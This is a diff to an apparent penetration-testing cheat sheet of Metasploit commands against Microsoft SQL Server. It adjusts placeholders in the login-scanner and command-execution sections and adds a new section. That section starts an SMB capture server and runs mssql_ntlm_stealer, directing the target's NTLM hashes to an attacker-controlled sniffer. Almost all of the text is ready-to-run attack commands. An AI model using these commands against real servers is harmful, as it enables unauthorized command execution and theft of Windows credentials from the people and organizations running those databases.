@@ -51,13 +51,13 @@ set RHOSTS <ip>
 set PASSWORD <password>
 set username <user>
 set domain <domain>
-set USE_WINDOWS_AUTHENT true
+set USE_WINDOWS_AUTHENT <true>
 ```
 
 ## Run
 ```ruby
 use auxiliary/scanner/mssql/mssql_login
-run -o PASSWORD=<password>,username=<username>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port> <ip>
+run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port> <ip>
 ``
 
 # Microsoft SQL Server command execution
@@ -68,13 +68,35 @@ set RHOSTS <ip>
 set PASSWORD <password>
 set username <user>
 set domain <domain>
-set USE_WINDOWS_AUTHENT true
+set USE_WINDOWS_AUTHENT <true>
 set CMD <whoami>
-
 ```
 
 ## Run
 ```ruby
 use auxiliary/admin/mssql/mssql_exec
-run -o PASSWORD=<password>,username=<username>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port>,CMD=<whoami> <ip>
+run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port>,CMD=<whoami> <ip>
+```
+
+# Microsoft SQL Server NTLM stealer
+## Options
+```ruby
+use auxiliary/server/capture/smb
+run
+use admin/mssql/mssql_ntlm_stealer
+set RHOSTS <ip>
+set PASSWORD <password>
+set username <user>
+set domain <domain>
+set SMBPROXY <ip_of_smb_sniffer>
+set USE_WINDOWS_AUTHENT <true>
+run
+```
+
+## Run
+```ruby
+use auxiliary/server/capture/smb
+run
+use admin/mssql/mssql_ntlm_stealer
+run -o PASSWORD=<password>,username=<user>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port>,SMBPROXY=<ip_of_smb_sniffer> <ip>
 ```
